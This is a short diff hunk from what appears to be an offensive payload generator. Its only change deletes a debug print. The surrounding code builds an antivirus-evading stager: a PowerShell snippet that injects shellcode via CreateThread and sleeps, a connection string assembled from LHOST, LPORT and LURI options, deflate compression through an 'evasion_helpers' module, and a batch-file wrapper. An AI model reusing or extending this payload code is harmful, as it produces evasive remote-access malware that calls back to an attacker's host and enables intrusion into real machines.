@@ -68,7 +68,6 @@ $o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" 
                                                                               self.required_options["LPORT"][0],
                                                                               "" if self.required_options["LURI"][0] == "/" else "%s/" % self.required_options["LURI"][0])
         baseString += '}\n' * num_ends
-        print(baseString)
         encoded = evasion_helpers.deflate(baseString)
         payload_code = "@echo off\n"
         payload_code += "if %PROCESSOR_ARCHITECTURE%==x86 ("
